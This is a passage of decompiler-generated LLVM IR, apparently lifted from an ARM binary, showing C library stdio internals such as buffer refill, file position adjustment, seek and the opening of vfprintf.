  store i1 %v2_19e60, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_19e60, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_19e58, i32* @r4, align 4
  store i32 %v6_19e58, i32* @r5, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_19e70 = icmp slt i32 %arg2, 0
  %v2_19e70 = icmp eq i32 %arg2, 0
  store i1 %v2_19e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19e70, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_19e78 = add i32 %tmp, 4
  %v2_19e78 = inttoptr i32 %v1_19e78 to i32*
  %v3_19e78 = load i32, i32* %v2_19e78, align 4
  store i32 %v3_19e78, i32* @r0, align 4
  %v1_19e7c = call i32 @__libc_read(i32 %v3_19e78)
  store i32 %v1_19e7c, i32* %r0.global-to-local, align 4
  %v2_19e80 = icmp eq i32 %v1_19e7c, 0
  store i1 %v2_19e80, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_19e7c, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_19e84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_19e84, i32* @r4, align 4
  store i32 %v6_19e58, i32* @r5, align 4
  ret i32 %v1_19e7c

bb13:                                             ; preds = %bb10
  %v0_19e88 = load i32, i32* @r4, align 4
  %v1_19e88 = inttoptr i32 %v0_19e88 to i32*
  %v2_19e88 = load i32, i32* %v1_19e88, align 4
  %v1_19e8c = or i32 %v2_19e88, 8
  store i32 %v1_19e8c, i32* %r1.global-to-local, align 4
  %v1_19e90 = or i32 %v2_19e88, 4
  store i32 %v1_19e90, i32* %r3.global-to-local, align 4
  %v3_19e94 = sdiv i32 %v2_19e88, 256
  store i32 %v3_19e94, i32* %ip.global-to-local, align 4
  br i1 %v2_19e80, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_19e9c = load i32, i32* @r5, align 4
  store i32 %v1_19e9c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_19ea0 = trunc i32 %v3_19e94 to i8
  %v4_19ea0 = add i32 %v0_19e88, 1
  %v5_19ea0 = inttoptr i32 %v4_19ea0 to i8*
  store i8 %v2_19ea0, i8* %v5_19ea0, align 1
  %v0_19ea4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19ea4.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_19ea4 = load i32, i32* %r3.global-to-local, align 4
  %v2_19ea4 = trunc i32 %v1_19ea4 to i8
  %v3_19ea4 = load i32, i32* @r4, align 4
  %v4_19ea4 = inttoptr i32 %v3_19ea4 to i8*
  store i8 %v2_19ea4, i8* %v4_19ea4, align 1
  %v0_19ea8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19ea8.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_19ea8 = load i32, i32* %ip.global-to-local, align 4
  %v2_19ea8 = trunc i32 %v1_19ea8 to i8
  %v3_19ea8 = load i32, i32* @r4, align 4
  %v4_19ea8 = add i32 %v3_19ea8, 1
  %v5_19ea8 = inttoptr i32 %v4_19ea8 to i8*
  store i8 %v2_19ea8, i8* %v5_19ea8, align 1
  %v0_19eac.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19eac.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_19eac = load i32, i32* %r1.global-to-local, align 4
  %v2_19eac = trunc i32 %v1_19eac to i8
  %v3_19eac = load i32, i32* @r4, align 4
  %v4_19eac = inttoptr i32 %v3_19eac to i8*
  store i8 %v2_19eac, i8* %v4_19eac, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_19eb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19eb0, i32* @r4, align 4
  store i32 %v6_19e58, i32* @r5, align 4
  %v11_19eb0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_19eb0

; uselistorder directives
  uselistorder i32 %v3_19e94, { 1, 0 }
  uselistorder i32 %v6_19e58, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 4, 2, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 0, 4, 3, 5, 2, 1 }
  uselistorder i32 2147483647, { 3, 4, 0, 2, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19eb4 = load i32, i32* @r4, align 4
  store i32 %v3_19eb4, i32* %stack_var_-16, align 4
  %v2_19eb8 = add i32 %tmp, 1
  %v3_19eb8 = inttoptr i32 %v2_19eb8 to i8*
  %v4_19eb8 = load i8, i8* %v3_19eb8, align 1
  %v5_19eb8 = zext i8 %v4_19eb8 to i32
  %v3_19ebc = load i8, i8* %arg1, align 1
  %v4_19ebc = zext i8 %v3_19ebc to i32
  store i32 %v4_19ebc, i32* %r2.global-to-local, align 4
  %v4_19ec0 = mul nuw nsw i32 %v5_19eb8, 256
  %v5_19ec0 = or i32 %v4_19ebc, %v4_19ec0
  store i32 %v5_19ec0, i32* @lr, align 4
  %tmp15 = urem i8 %v3_19ebc, 4
  %v2_19ec4 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_19ec4, label %bb, label %dec_label_pc_19ed4

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_19ed4:                               ; preds = %entry
  %v1_19ec4 = zext i8 %tmp15 to i32
  %v1_19ed4 = add nsw i32 %v1_19ec4, -1
  %v7_19ed4 = icmp eq i8 %tmp15, 1
  br i1 %v7_19ed4, label %.thread, label %dec_label_pc_19edc

dec_label_pc_19edc:                               ; preds = %dec_label_pc_19ed4
  %v1_19edc = and i32 %v4_19ec0, 2048
  %v2_19edc = icmp eq i32 %v1_19edc, 0
  br i1 %v2_19edc, label %.thread, label %dec_label_pc_19ee4

dec_label_pc_19ee4:                               ; preds = %dec_label_pc_19edc
  %v8_19ee8 = icmp sgt i32 %v1_19ed4, 1
  br i1 %v8_19ee8, label %dec_label_pc_19f74, label %dec_label_pc_19eec

dec_label_pc_19eec:                               ; preds = %dec_label_pc_19ee4
  %v2_19eec = add i32 %tmp, 40
  %v3_19eec = inttoptr i32 %v2_19eec to i32*
  %v4_19eec = load i32, i32* %v3_19eec, align 4
  %v2_19ef0 = icmp eq i32 %v4_19eec, 0
  br i1 %v2_19ef0, label %dec_label_pc_19ef8, label %dec_label_pc_19f74

dec_label_pc_19ef8:                               ; preds = %dec_label_pc_19eec
  %v2_19ef8 = add i32 %tmp, 3
  %v3_19ef8 = inttoptr i32 %v2_19ef8 to i8*
  %v4_19ef8 = load i8, i8* %v3_19ef8, align 1
  %v5_19ef8 = zext i8 %v4_19ef8 to i32
  %v2_19efc = add i32 %tmp, 44
  %v3_19efc = inttoptr i32 %v2_19efc to i32*
  %v4_19efc = load i32, i32* %v3_19efc, align 4
  store i32 %v4_19efc, i32* %r2.global-to-local, align 4
  %v2_19f00 = sub nsw i32 %v1_19ed4, %v5_19ef8
  %v1_19f08 = add nsw i32 %v2_19f00, -1
  %tmp11 = icmp slt i32 %v4_19efc, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_19ef8
  %v7_19f0c = add i32 %tmp, 2
  %v8_19f0c = inttoptr i32 %v7_19f0c to i8*
  %v9_19f0c = load i8, i8* %v8_19f0c, align 1
  %v10_19f0c = zext i8 %v9_19f0c to i32
  %v7_19f10 = sub nsw i32 %v1_19f08, %v10_19f0c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19ef8, %bb, %dec_label_pc_19edc, %dec_label_pc_19ed4, %bb12
  %v0_19f2c = phi i32 [ %v1_19ed4, %dec_label_pc_19edc ], [ %v1_19ed4, %dec_label_pc_19ed4 ], [ 0, %bb ], [ %v7_19f10, %bb12 ], [ %v1_19f08, %dec_label_pc_19ef8 ]
  %v1_19f14 = and i32 %v4_19ebc, 64
  %v2_19f14 = icmp eq i32 %v1_19f14, 0
  %storemerge.in.in.v = select i1 %v2_19f14, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_19f20 = add i32 %tmp, 16
  %v3_19f20 = inttoptr i32 %v2_19f20 to i32*
  %v4_19f20 = load i32, i32* %v3_19f20, align 4
  %v2_19f24 = sub i32 %storemerge, %v4_19f20
  %v1_19f28 = inttoptr i32 %arg2 to i32*
  %v2_19f28 = load i32, i32* %v1_19f28, align 4
  store i32 %v2_19f28, i32* %r1.global-to-local, align 4
  %v3_19f28 = add i32 %arg2, 4
  %v4_19f28 = inttoptr i32 %v3_19f28 to i32*
  %v5_19f28 = load i32, i32* %v4_19f28, align 4
  store i32 %v5_19f28, i32* %r2.global-to-local, align 4
  %v2_19f2c = add i32 %v2_19f24, %v0_19f2c
  store i32 %v2_19f2c, i32* %r5.global-to-local, align 4
  %v2_19f30 = sub i32 %v2_19f28, %v2_19f2c
  %v2_19f34 = and i32 %v2_19f2c, 1073741824
  %v3_19f34 = icmp ne i32 %v2_19f34, 0
  %v6_19f34 = icmp eq i1 %v3_19f34, false
  %tmp16 = icmp slt i32 %v2_19f2c, 0
  %v4_19f34.neg = zext i1 %tmp16 to i32
  %v7_19f34 = add i32 %v5_19f28, %v4_19f34.neg
  %v9_19f34 = sext i1 %v6_19f34 to i32
  %v10_19f34 = add i32 %v7_19f34, %v9_19f34
  store i32 %v10_19f34, i32* %r4.global-to-local, align 4
  store i32 %v2_19f30, i32* %v1_19f28, align 4
  %v5_19f38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19f38, i32* %v4_19f28, align 4
  %v0_19f3c = load i32, i32* %r6.global-to-local, align 4
  %v1_19f3c = add i32 %v0_19f3c, 4
  %v2_19f3c = inttoptr i32 %v1_19f3c to i32*
  %v3_19f3c = load i32, i32* %v2_19f3c, align 4
  %v1_19f40 = load i32, i32* %r2.global-to-local, align 4
  %v8_19f44 = icmp sgt i32 %v3_19f3c, %v1_19f40
  br i1 %v8_19f44, label %dec_label_pc_19f58, label %dec_label_pc_19f48

dec_label_pc_19f48:                               ; preds = %.thread
  %v9_19f40 = icmp eq i32 %v3_19f3c, %v1_19f40
  br i1 %v9_19f40, label %dec_label_pc_19f4c, label %dec_label_pc_19f5cthread-pre-split

dec_label_pc_19f4c:                               ; preds = %dec_label_pc_19f48
  %v1_19f4c = inttoptr i32 %v0_19f3c to i32*
  %v2_19f4c = load i32, i32* %v1_19f4c, align 4
  %v1_19f50 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_19f4c, %v1_19f50
  br i1 %tmp17, label %dec_label_pc_19f58, label %dec_label_pc_19f5cthread-pre-split

dec_label_pc_19f58:                               ; preds = %dec_label_pc_19f4c, %.thread
  %v0_19f58 = load i32, i32* %r5.global-to-local, align 4
  %v1_19f58 = sub i32 0, %v0_19f58
  store i32 %v1_19f58, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19f5c

dec_label_pc_19f5cthread-pre-split:               ; preds = %dec_label_pc_19f4c, %dec_label_pc_19f48
  %v0_19f5c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19f5c

dec_label_pc_19f5c:                               ; preds = %dec_label_pc_19f5cthread-pre-split, %dec_label_pc_19f58
  %v0_19f5c = phi i32 [ %v0_19f5c.pr, %dec_label_pc_19f5cthread-pre-split ], [ %v1_19f58, %dec_label_pc_19f58 ]
  %v1_19f5c = icmp slt i32 %v0_19f5c, 0
  br i1 %v1_19f5c, label %dec_label_pc_19f64, label %dec_label_pc_19f78

dec_label_pc_19f64:                               ; preds = %dec_label_pc_19f5c
  %v0_19f64 = call i32 @__errno_location()
  %v2_19f6c = inttoptr i32 %v0_19f64 to i32*
  store i32 75, i32* %v2_19f6c, align 4
  %v0_19f78.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19f78

dec_label_pc_19f74:                               ; preds = %dec_label_pc_19eec, %dec_label_pc_19ee4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19f78

dec_label_pc_19f78:                               ; preds = %dec_label_pc_19f5c, %dec_label_pc_19f64, %dec_label_pc_19f74
  %v0_19f78 = phi i32 [ %v0_19f5c, %dec_label_pc_19f5c ], [ %v0_19f78.pre, %dec_label_pc_19f64 ], [ -1, %dec_label_pc_19f74 ]
  %v2_19f7c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19f7c, i32* @r4, align 4
  ret i32 %v0_19f78

; uselistorder directives
  uselistorder i32 %v1_19f40, { 1, 0 }
  uselistorder i32 %v3_19f3c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_19ebc, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19f78, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19f80 = load i32, i32* @r4, align 4
  store i32 %v3_19f80, i32* %stack_var_-8, align 4
  %v1_19f84 = add i32 %arg1, 8
  %v1_19f88 = inttoptr i32 %v1_19f84 to i32*
  %v2_19f88 = load i32, i32* %v1_19f88, align 4
  store i32 %v2_19f88, i32* @r1, align 4
  %v3_19f88 = add i32 %arg1, 12
  %v4_19f88 = inttoptr i32 %v3_19f88 to i32*
  %v5_19f88 = load i32, i32* %v4_19f88, align 4
  %v2_19f8c = sub i32 %v5_19f88, %v2_19f88
  store i32 %v2_19f8c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19f94 = inttoptr i32 %arg1 to i8*
  %v4_19f94 = call i32 @__stdio_READ(i8* %v3_19f94, i32 %v2_19f88, i32 %v2_19f8c)
  %v0_19f98 = load i32, i32* @r4, align 4
  %v1_19f98 = add i32 %v0_19f98, 8
  %v2_19f98 = inttoptr i32 %v1_19f98 to i32*
  %v3_19f98 = load i32, i32* %v2_19f98, align 4
  store i32 %v3_19f98, i32* %r2.global-to-local, align 4
  %v2_19f9c = add i32 %v3_19f98, %v4_19f94
  %v2_19fa0 = add i32 %v0_19f98, 20
  %v3_19fa0 = inttoptr i32 %v2_19fa0 to i32*
  store i32 %v2_19f9c, i32* %v3_19fa0, align 4
  %v0_19fa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_19fa4 = load i32, i32* @r4, align 4
  %v2_19fa4 = add i32 %v1_19fa4, 16
  %v3_19fa4 = inttoptr i32 %v2_19fa4 to i32*
  store i32 %v0_19fa4, i32* %v3_19fa4, align 4
  %v2_19fa8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19fa8, i32* @r4, align 4
  ret i32 %v4_19f94

; uselistorder directives
  uselistorder i32 %v4_19f94, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19fac = load i32, i32* @r4, align 4
  store i32 %v3_19fac, i32* %stack_var_-12, align 4
  %v0_19fb0 = load i32, i32* @r0, align 4
  %v1_19fb0 = inttoptr i32 %v0_19fb0 to i8*
  %v2_19fb0 = load i8, i8* %v1_19fb0, align 1
  %v3_19fb0 = zext i8 %v2_19fb0 to i32
  store i32 %v3_19fb0, i32* %r2.global-to-local, align 4
  %v1_19fb4 = add i32 %v0_19fb0, 1
  %v2_19fb4 = inttoptr i32 %v1_19fb4 to i8*
  %v3_19fb4 = load i8, i8* %v2_19fb4, align 1
  %v4_19fb4 = zext i8 %v3_19fb4 to i32
  store i32 %v4_19fb4, i32* %r3.global-to-local, align 4
  %v4_19fb8 = mul nuw nsw i32 %v4_19fb4, 256
  %v5_19fb8 = or i32 %v4_19fb8, %v3_19fb0
  store i32 %v5_19fb8, i32* %r2.global-to-local, align 4
  %v1_19fbc = load i32, i32* @r1, align 4
  %v2_19fbc = and i32 %v1_19fbc, %v5_19fb8
  %v4_19fbc = icmp eq i32 %v2_19fbc, 0
  store i32 %v0_19fb0, i32* @r4, align 4
  br i1 %v4_19fbc, label %dec_label_pc_19fc8, label %dec_label_pc_19fe0

dec_label_pc_19fc8:                               ; preds = %entry
  %v1_19fc8 = and i32 %v5_19fb8, 2176
  %v2_19fc8 = icmp eq i32 %v1_19fc8, 0
  br i1 %v2_19fc8, label %dec_label_pc_19fd0, label %dec_label_pc_19ff4

dec_label_pc_19fd0:                               ; preds = %dec_label_pc_19fc8
  %v2_19fd0 = or i32 %v1_19fbc, %v5_19fb8
  store i32 %v2_19fd0, i32* %r2.global-to-local, align 4
  %v3_19fd4 = sdiv i32 %v2_19fd0, 256
  store i32 %v3_19fd4, i32* %r3.global-to-local, align 4
  %v1_19fd8 = trunc i32 %v3_19fd4 to i8
  store i8 %v1_19fd8, i8* %v2_19fb4, align 1
  %v0_19fdc = load i32, i32* %r2.global-to-local, align 4
  %v1_19fdc = trunc i32 %v0_19fdc to i8
  %v2_19fdc = load i32, i32* @r0, align 4
  %v3_19fdc = inttoptr i32 %v2_19fdc to i8*
  store i8 %v1_19fdc, i8* %v3_19fdc, align 1
  %v0_19fe0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19fe0

dec_label_pc_19fe0:                               ; preds = %entry, %dec_label_pc_19fd0
  %v0_19fe0 = phi i32 [ %v0_19fb0, %entry ], [ %v0_19fe0.pre, %dec_label_pc_19fd0 ]
  %v1_19fe0 = inttoptr i32 %v0_19fe0 to i8*
  %v2_19fe0 = load i8, i8* %v1_19fe0, align 1
  %v3_19fe0 = zext i8 %v2_19fe0 to i32
  store i32 %v3_19fe0, i32* %r2.global-to-local, align 4
  %v1_19fe4 = add i32 %v0_19fe0, 1
  %v2_19fe4 = inttoptr i32 %v1_19fe4 to i8*
  %v3_19fe4 = load i8, i8* %v2_19fe4, align 1
  %v4_19fe4 = zext i8 %v3_19fe4 to i32
  %v4_19fe8 = mul nuw nsw i32 %v4_19fe4, 256
  %v5_19fe8 = or i32 %v4_19fe8, %v3_19fe0
  store i32 %v5_19fe8, i32* %r3.global-to-local, align 4
  %v1_19fec = and i32 %v3_19fe0, 16
  store i32 %v1_19fec, i32* %r5.global-to-local, align 4
  %v2_19fec = icmp eq i32 %v1_19fec, 0
  br i1 %v2_19fec, label %dec_label_pc_1a01c, label %dec_label_pc_19ff4

dec_label_pc_19ff4:                               ; preds = %dec_label_pc_19fc8, %dec_label_pc_19fe0
  %v0_19ff4 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_19ffc = inttoptr i32 %v0_19ff4 to i32*
  store i32 9, i32* %v2_19ffc, align 4
  br label %dec_label_pc_1a000

dec_label_pc_1a000:                               ; preds = %dec_label_pc_1a024, %dec_label_pc_19ff4
  %v0_1a000 = load i32, i32* @r4, align 4
  %v1_1a000 = inttoptr i32 %v0_1a000 to i32*
  %v2_1a000 = load i32, i32* %v1_1a000, align 4
  %v1_1a004 = or i32 %v2_1a000, 8
  store i32 %v1_1a004, i32* %r3.global-to-local, align 4
  %v3_1a008 = sdiv i32 %v2_1a000, 256
  store i32 %v3_1a008, i32* %r2.global-to-local, align 4
  %v1_1a010 = trunc i32 %v3_1a008 to i8
  %v3_1a010 = add i32 %v0_1a000, 1
  %v4_1a010 = inttoptr i32 %v3_1a010 to i8*
  store i8 %v1_1a010, i8* %v4_1a010, align 1
  %v0_1a014 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a014 = trunc i32 %v0_1a014 to i8
  %v2_1a014 = load i32, i32* @r4, align 4
  %v3_1a014 = inttoptr i32 %v2_1a014 to i8*
  store i8 %v1_1a014, i8* %v3_1a014, align 1
  %v2_1a018 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a018, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1a01c:                               ; preds = %dec_label_pc_19fe0
  %v1_1a01c = and i32 %v3_19fe0, 64
  %v2_1a01c = icmp eq i32 %v1_1a01c, 0
  br i1 %v2_1a01c, label %dec_label_pc_1a04c, label %dec_label_pc_1a024

dec_label_pc_1a024:                               ; preds = %dec_label_pc_1a01c
  %v0_1a024 = call i32 @__stdio_wcommit()
  %v2_1a028 = icmp eq i32 %v0_1a024, 0
  br i1 %v2_1a028, label %dec_label_pc_1a030, label %dec_label_pc_1a000

dec_label_pc_1a030:                               ; preds = %dec_label_pc_1a024
  %v0_1a030 = load i32, i32* @r4, align 4
  %v1_1a030 = inttoptr i32 %v0_1a030 to i32*
  %v2_1a030 = load i32, i32* %v1_1a030, align 4
  store i32 %v2_1a030, i32* %r3.global-to-local, align 4
  %v1_1a034 = add i32 %v0_1a030, 8
  %v2_1a034 = inttoptr i32 %v1_1a034 to i32*
  %v3_1a034 = load i32, i32* %v2_1a034, align 4
  store i32 %v3_1a034, i32* %r2.global-to-local, align 4
  %v1_1a038 = and i32 %v2_1a030, -65
  store i32 %v1_1a038, i32* %r3.global-to-local, align 4
  %v3_1a03c = sdiv i32 %v2_1a030, 256
  store i32 %v3_1a03c, i32* %r1.global-to-local, align 4
  %v2_1a040 = add i32 %v0_1a030, 28
  %v3_1a040 = inttoptr i32 %v2_1a040 to i32*
  store i32 %v3_1a034, i32* %v3_1a040, align 4
  %v0_1a044 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a044 = trunc i32 %v0_1a044 to i8
  %v2_1a044 = load i32, i32* @r4, align 4
  %v3_1a044 = add i32 %v2_1a044, 1
  %v4_1a044 = inttoptr i32 %v3_1a044 to i8*
  store i8 %v1_1a044, i8* %v4_1a044, align 1
  %v0_1a048 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a048 = trunc i32 %v0_1a048 to i8
  %v2_1a048 = load i32, i32* @r4, align 4
  %v3_1a048 = inttoptr i32 %v2_1a048 to i8*
  store i8 %v1_1a048, i8* %v3_1a048, align 1
  %v0_1a04c.pre = load i32, i32* @r4, align 4
  %v0_1a058.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a04c

dec_label_pc_1a04c:                               ; preds = %dec_label_pc_1a01c, %dec_label_pc_1a030
  %v0_1a058 = phi i32 [ 0, %dec_label_pc_1a01c ], [ %v0_1a058.pre, %dec_label_pc_1a030 ]
  %v2_1a05c = phi i32 [ %v0_19fe0, %dec_label_pc_1a01c ], [ %v0_1a04c.pre, %dec_label_pc_1a030 ]
  %v1_1a04c = inttoptr i32 %v2_1a05c to i32*
  %v2_1a04c = load i32, i32* %v1_1a04c, align 4
  %v1_1a050 = or i32 %v2_1a04c, 1
  store i32 %v1_1a050, i32* %r3.global-to-local, align 4
  %v3_1a054 = sdiv i32 %v2_1a04c, 256
  store i32 %v3_1a054, i32* %r2.global-to-local, align 4
  %v1_1a05c = trunc i32 %v3_1a054 to i8
  %v3_1a05c = add i32 %v2_1a05c, 1
  %v4_1a05c = inttoptr i32 %v3_1a05c to i8*
  store i8 %v1_1a05c, i8* %v4_1a05c, align 1
  %v0_1a060 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a060 = trunc i32 %v0_1a060 to i8
  %v2_1a060 = load i32, i32* @r4, align 4
  %v3_1a060 = inttoptr i32 %v2_1a060 to i8*
  store i8 %v1_1a060, i8* %v3_1a060, align 1
  %v2_1a064 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a064, i32* @r4, align 4
  ret i32 %v0_1a058

; uselistorder directives
  uselistorder i32 %v3_1a054, { 1, 0 }
  uselistorder i32 %v3_1a008, { 1, 0 }
  uselistorder i32 %v3_19fe0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19fe0, { 0, 2, 1 }
  uselistorder i32 %v3_19fd4, { 1, 0 }
  uselistorder i32 %v5_19fb8, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1a04c, { 1, 0 }
  uselistorder label %dec_label_pc_19ff4, { 1, 0 }
  uselistorder label %dec_label_pc_19fe0, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v1_1a070 = add i32 %arg1, 4
  %v2_1a070 = inttoptr i32 %v1_1a070 to i32*
  %v3_1a070 = load i32, i32* %v2_1a070, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1a078 = load i32, i32* %arg2, align 4
  %v3_1a078 = add i32 %tmp, 4
  %v4_1a078 = inttoptr i32 %v3_1a078 to i32*
  %v5_1a078 = load i32, i32* %v4_1a078, align 4
  %v6_1a07c = call i32 @__libc_lseek64(i32 %v3_1a070, i32 %v2_1a078, i32 %v5_1a078, i32 %arg3)
  %v1_1a080 = icmp slt i32 %v2_1a078, 0
  %v6_1a07c. = select i1 %v1_1a080, i32 %v6_1a07c, i32 0
  store i32 %v6_1a07c., i32* %r3.global-to-local, align 4
  br i1 %v1_1a080, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_1a08c = load i32, i32* @r4, align 4
  %v4_1a08c = inttoptr i32 %v3_1a08c to i32*
  store i32 %v6_1a07c, i32* %v4_1a08c, align 4
  %v6_1a08c = add i32 %v3_1a08c, 4
  %v7_1a08c = inttoptr i32 %v6_1a08c to i32*
  store i32 %v2_1a078, i32* %v7_1a08c, align 4
  %v0_1a090.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_1a090 = phi i32 [ %v6_1a07c, %entry ], [ %v0_1a090.pre, %bb ]
  ret i32 %v0_1a090

; uselistorder directives
  uselistorder i32 %v6_1a07c, { 0, 2, 1 }
  uselistorder i32 %v2_1a078, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v6_1a098 = load i32, i32* @r5, align 4
  %v12_1a098 = load i32, i32* @r7, align 4
  %v15_1a098 = load i32, i32* @r8, align 4
  %v0_1a09c = load i32, i32* @r0, align 4
  %v1_1a09c = add i32 %v0_1a09c, 52
  %v2_1a09c = inttoptr i32 %v1_1a09c to i32*
  %v3_1a09c = load i32, i32* %v2_1a09c, align 4
  store i32 %v3_1a09c, i32* @r8, align 4
  %v1_1a0a0 = add i32 %v0_1a09c, 56
  store i32 %v1_1a0a0, i32* @r5, align 4
  %v2_1a0a4 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1a0a8 = icmp eq i32 %v3_1a09c, 0
  store i32 %v0_1a09c, i32* @r4, align 4
  %v0_1a0b0 = load i32, i32* @r1, align 4
  store i32 %v0_1a0b0, i32* @r7, align 4
  %v0_1a0b4 = load i32, i32* @r2, align 4
  store i32 %v0_1a0b4, i32* @r6, align 4
  store i32 %v2_1a0a4, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v1_1a0a0, i32* @r2, align 4
  br i1 %v2_1a0a8, label %dec_label_pc_1a0c8, label %dec_label_pc_1a0e4

dec_label_pc_1a0c8:                               ; preds = %entry
  %v1_1a0d0 = call i32 @__pthread_cleanup_push_defer()
  %v0_1a0d4 = load i32, i32* @r5, align 4
  store i32 106724, i32* @lr, align 4
  %v2_1a0e0 = call i32 @pthread_mutex_lock(i32 %v0_1a0d4)
  %v0_1a0e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a0e4:                               ; preds = %entry, %dec_label_pc_1a0c8
  %v0_1a0f4 = phi i32 [ %v0_1a09c, %entry ], [ %v0_1a0e4.pre, %dec_label_pc_1a0c8 ]
  %v1_1a0e4 = inttoptr i32 %v0_1a0f4 to i8*
